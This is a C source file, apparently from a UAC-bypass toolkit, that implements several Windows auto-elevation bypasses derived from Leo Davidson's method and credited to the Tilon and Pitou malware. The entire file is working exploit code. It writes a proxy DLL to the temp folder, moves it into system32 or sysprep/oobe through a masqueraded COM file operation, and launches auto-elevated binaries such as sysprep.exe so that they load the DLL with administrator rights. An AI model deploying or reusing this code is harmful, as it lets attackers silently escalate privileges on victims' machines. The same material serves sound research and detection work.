/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2014 - 2018
*
*  TITLE:       PITOU.C
*
*  VERSION:     3.00
*
*  DATE:        25 Aug 2018
*
*  Leo Davidson based IFileOperation auto-elevation.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"

/*
* ucmStandardAutoElevation2
*
* Purpose:
*
* Bypass UAC by abusing appinfo g_lpAutoApproveEXEList
*
* UAC contain whitelist of trusted fusion processes with only names and no other special restrictions.
*
*/
BOOL ucmStandardAutoElevation2(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize
)
{
    BOOL  cond = FALSE, bResult = FALSE;
    WCHAR SourceFilePathAndName[MAX_PATH + 1];
    WCHAR DestinationFilePathAndName[MAX_PATH + 1];

    do {

        //source filename of dll
        RtlSecureZeroMemory(SourceFilePathAndName, sizeof(SourceFilePathAndName));
        _strcpy(SourceFilePathAndName, g_ctx.szTempDirectory);
        _strcat(SourceFilePathAndName, UNBCL_DLL);

        if (!supWriteBufferToFile(SourceFilePathAndName, ProxyDll, ProxyDllSize))
            break;

        //copy %temp\unbcl.dll -> system32\unbcl.dll
        if (!ucmMasqueradedMoveFileCOM(SourceFilePathAndName, g_ctx.szSystemDirectory))
            break;

        //source filename of process
        RtlSecureZeroMemory(SourceFilePathAndName, sizeof(SourceFilePathAndName));
        _strcpy(SourceFilePathAndName, g_ctx.szSystemDirectory);
        _strcat(SourceFilePathAndName, SYSPREP_DIR);
        _strcat(SourceFilePathAndName, SYSPREP_EXE);

        RtlSecureZeroMemory(DestinationFilePathAndName, sizeof(DestinationFilePathAndName));
        _strcpy(DestinationFilePathAndName, g_ctx.szTempDirectory);
        _strcat(DestinationFilePathAndName, OOBE_EXE);

        //system32\sysprep\sysprep.exe -> temp\oobe.exe
        if (!CopyFile(SourceFilePathAndName, DestinationFilePathAndName, FALSE)) {
            break;
        }

        //temp\oobe.exe -> system32\oobe.exe
        if (!ucmMasqueradedMoveFileCOM(DestinationFilePathAndName, g_ctx.szSystemDirectory)) {
            break;
        }

        RtlSecureZeroMemory(DestinationFilePathAndName, sizeof(DestinationFilePathAndName));
        _strcpy(DestinationFilePathAndName, g_ctx.szSystemDirectory);
        _strcat(DestinationFilePathAndName, OOBE_EXE);

        bResult = supRunProcess(DestinationFilePathAndName, NULL);

    } while (cond);

    return bResult;
}

/*
* ucmStandardAutoElevation
*
* Purpose:
*
* Leo Davidson AutoElevation method with derivatives.
*
* UacMethodSysprep1   - Original Leo Davidson concept.
* UacMethodSysprep2   - Windows 8.1 adapted UacMethodSysprep1 (bypassing sysprep embedded manifest dlls redirection).
* UacMethodTilon      - Leo Davidson concept with different target dll, used by Win32/Tilon.
* UacMethodSysprep3   - Windows 10 TH1 adapted UacMethodSysprep1.
* UacMethodOobe       - WinNT/Pitou derivative from Leo Davidson concept.
*
*/
BOOL ucmStandardAutoElevation(
    _In_ UCM_METHOD Method,
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize
)
{
    BOOL    cond = FALSE, bResult = FALSE;
    WCHAR   szSourceDll[MAX_PATH * 2];
    WCHAR   szTargetDir[MAX_PATH * 2];
    WCHAR   szTargetProcess[MAX_PATH * 2];


    _strcpy(szSourceDll, g_ctx.szTempDirectory);
    _strcpy(szTargetDir, g_ctx.szSystemDirectory);
    _strcpy(szTargetProcess, g_ctx.szSystemDirectory);

    switch (Method) {

    case UacMethodSysprep1:

        //%temp%\cryptbase.dll
        _strcat(szSourceDll, CRYPTBASE_DLL);

        //%systemroot%\system32\sysprep      
        _strcat(szTargetDir, SYSPREP_DIR);

        //%systemroot%\system32\sysprep\sysprep.exe    
        _strcat(szTargetProcess, SYSPREP_DIR);
        _strcat(szTargetProcess, SYSPREP_EXE);

        break;

    case UacMethodSysprep2:

        //%temp\\shcore.dll
        _strcat(szSourceDll, SHCORE_DLL);

        //%systemroot%\system32\sysprep
        _strcat(szTargetDir, SYSPREP_DIR);

        //%systemroot%\system32\sysprep\sysprep.exe
        _strcat(szTargetProcess, SYSPREP_DIR);
        _strcat(szTargetProcess, SYSPREP_EXE);

        break;

    case UacMethodSysprep3:

        //%temp%\dbgcore.dll
        _strcat(szSourceDll, DBGCORE_DLL);

        //%systemroot%\system32\sysprep
        _strcat(szTargetDir, SYSPREP_DIR);

        //%systemroot%\system32\sysprep\sysprep.exe
        _strcat(szTargetProcess, SYSPREP_DIR);
        _strcat(szTargetProcess, SYSPREP_EXE);

        break;

    case UacMethodOobe:

        //%temp%\wdscore.dll
        _strcat(szSourceDll, WDSCORE_DLL);

        //%systemroot%\system32\oobe\"
        _strcat(szTargetDir, L"oobe\\");

        //%systemroot%\system32\oobe\setupsqm.exe
        _strcat(szTargetProcess, SETUPSQM_EXE);

        break;

    case UacMethodTilon:

        //%temp%\ActionQueue.dll
        _strcat(szSourceDll, ACTIONQUEUE_DLL);

        //%systemroot%\system32\sysprep
        _strcat(szTargetDir, SYSPREP_DIR);

        //%systemroot%\system32\sysprep\sysprep.exe
        _strcat(szTargetProcess, SYSPREP_DIR);
        _strcat(szTargetProcess, SYSPREP_EXE);

        break;

    default:
        return FALSE;
    }

    do {

        if (!supWriteBufferToFile(szSourceDll, ProxyDll, ProxyDllSize))
            break;

        if (!ucmMasqueradedMoveFileCOM(szSourceDll, szTargetDir))
            break;

        bResult = supRunProcess(szTargetProcess, NULL);

    } while (cond);

    return bResult;
}
